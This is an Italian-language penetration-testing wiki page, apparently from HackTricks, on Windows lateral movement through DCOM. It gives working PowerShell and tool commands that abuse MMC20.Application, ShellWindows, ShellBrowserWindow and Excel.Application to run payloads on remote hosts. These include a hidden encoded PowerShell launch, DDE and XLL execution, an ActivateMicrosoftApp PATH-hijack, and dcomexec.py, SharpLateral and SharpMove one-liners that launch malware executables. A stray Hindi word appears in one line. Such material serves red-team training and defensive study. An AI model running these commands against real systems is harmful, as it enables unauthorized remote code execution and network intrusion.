# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Il lateral movement via DCOM è interessante perché riutilizza server COM già esposti tramite RPC/DCOM invece di creare un servizio o un'attività pianificata. In pratica questo significa che la connessione iniziale di solito parte su TCP/135 e poi si sposta su porte RPC alte assegnate dinamicamente.

## Prerequisiti & Gotchas

- Di solito serve un contesto di amministratore locale sul target e il server COM remoto deve अनुमति remote launch/activation.
- Since **March 14, 2023**, Microsoft enforces DCOM hardening for supported systems. Old clients that request a low activation authentication level can fail unless they negotiate at least `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Modern Windows clients are usually auto-raised, so current tooling normally keeps working.
- Manual or scripted DCOM execution generally needs TCP/135 plus the target's dynamic RPC port range. If you are using Impacket's `dcomexec.py` and you want command output back, you usually also need SMB access to `ADMIN$` (or another writable/readable share).
- If RPC/DCOM works but SMB is blocked, `dcomexec.py -nooutput` can still be useful for blind execution.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Per ulteriori informazioni su questa tecnica, controlla il post originale da [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Gli oggetti Distributed Component Object Model (DCOM) offrono una capacità interessante per interazioni basate su rete con gli oggetti. Microsoft fornisce una documentazione completa sia per DCOM sia per Component Object Model (COM), accessibile [qui per DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) e [qui per COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Un elenco di applicazioni DCOM può essere recuperato usando il comando PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
L'oggetto COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), consente lo scripting delle operazioni dei snap-in MMC. In particolare, questo oggetto contiene un metodo `ExecuteShellCommand` sotto `Document.ActiveView`. Maggiori informazioni su questo metodo sono disponibili [qui](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Verificalo in esecuzione:

Questa funzionalità facilita l'esecuzione di comandi su una rete tramite una applicazione DCOM. Per interagire con DCOM da remoto come admin, PowerShell può essere utilizzato come segue:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Questo comando si connette all'applicazione DCOM e restituisce un'istanza dell'oggetto COM. Il metodo ExecuteShellCommand può quindi essere invocato per eseguire un processo sull'host remoto. Il processo coinvolge i seguenti passaggi:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Ottieni RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
L’ultimo argomento è lo stile della finestra. `7` mantiene la finestra minimizzata. Operativamente, l’esecuzione basata su MMC porta comunemente a un processo `mmc.exe` remoto che avvia il tuo payload, il che è diverso dagli oggetti supportati da Explorer qui sotto.

## ShellWindows & ShellBrowserWindow

**Per maggiori informazioni su questa tecnica controlla il post originale [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

L’oggetto **MMC20.Application** è stato identificato come privo di "LaunchPermissions" espliciti, e per impostazione predefinita usa permessi che consentono l’accesso agli Administrators. Per ulteriori dettagli, è possibile consultare un thread [here](https://twitter.com/tiraniddo/status/817532039771525120), e si raccomanda l’uso di [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET per filtrare gli oggetti senza Launch Permission esplicita.

Due oggetti specifici, `ShellBrowserWindow` e `ShellWindows`, sono stati evidenziati per la loro mancanza di Launch Permissions esplicite. L’assenza di una voce di registro `LaunchPermission` sotto `HKCR:\AppID\{guid}` indica l’assenza di permessi espliciti.

Rispetto a `MMC20.Application`, questi oggetti sono spesso più silenziosi dal punto di vista OPSEC perché il comando finisce comunemente come figlio di `explorer.exe` sull’host remoto invece che di `mmc.exe`.

### ShellWindows

Per `ShellWindows`, che non ha un ProgID, i metodi .NET `Type.GetTypeFromCLSID` e `Activator.CreateInstance` facilitano l’istanziazione dell’oggetto usando il suo AppID. Questo processo sfrutta OleView .NET per recuperare il CLSID di `ShellWindows`. Una volta istanziato, è possibile interagire tramite il metodo `WindowsShell.Item`, portando a invocazioni di metodo come `Document.Application.ShellExecute`.

Sono stati forniti esempi di comandi PowerShell per istanziare l’oggetto ed eseguire comandi in remoto:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` è simile, ma puoi istanziarlo direttamente tramite il suo CLSID e pivotare a `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Movimento laterale con oggetti Excel DCOM

Il movimento laterale può essere ottenuto sfruttando oggetti DCOM Excel. Per informazioni dettagliate, è consigliabile leggere la discussione sull’uso di Excel DDE per il movimento laterale tramite DCOM sul [blog di Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Il progetto Empire fornisce uno script PowerShell, che dimostra l’utilizzo di Excel per l’esecuzione remota di codice (RCE) manipolando oggetti DCOM. Di seguito alcuni snippet dello script disponibile nel [repository GitHub di Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), che mostrano diversi metodi per abusare di Excel per RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Una ricerca recente ha ampliato quest'area con il metodo `ActivateMicrosoftApp()` di `Excel.Application`. L'idea chiave è che Excel può tentare di avviare applicazioni Microsoft legacy come FoxPro, Schedule Plus o Project cercandole nel `PATH` di sistema. Se un operatore può collocare un payload con uno di quei nomi attesi in una posizione scrivibile che fa parte del `PATH` del target, Excel lo eseguirà.

Requisiti per questa variante:

- Local admin sul target
- Excel installato sul target
- Possibilità di scrivere un payload in una directory scrivibile nel `PATH` del target

Esempio pratico che sfrutta la ricerca di FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Se l'host attaccante non ha registrato localmente il ProgID `Excel.Application`, istanzia l'oggetto remoto tramite CLSID invece:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Valori osservati abusati in pratica:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Strumenti di automazione per Lateral Movement

Due strumenti sono evidenziati per automatizzare queste tecniche:

- **Invoke-DCOM.ps1**: uno script PowerShell fornito dal progetto Empire che semplifica l’invocazione di diversi metodi per eseguire codice su macchine remote. Questo script è accessibile nel repository GitHub di Empire.

- **SharpLateral**: uno strumento progettato per eseguire codice da remoto, che può essere usato con il comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Strumenti automatici

- Lo script Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) consente di richiamare facilmente tutti i metodi commentati per eseguire codice su altre macchine.
- Puoi usare `dcomexec.py` di Impacket per eseguire comandi su sistemi remoti usando DCOM. Le build attuali supportano `ShellWindows`, `ShellBrowserWindow` e `MMC20`, e per impostazione predefinita usano `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Potresti anche usare [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Potresti anche usare [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Riferimenti

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
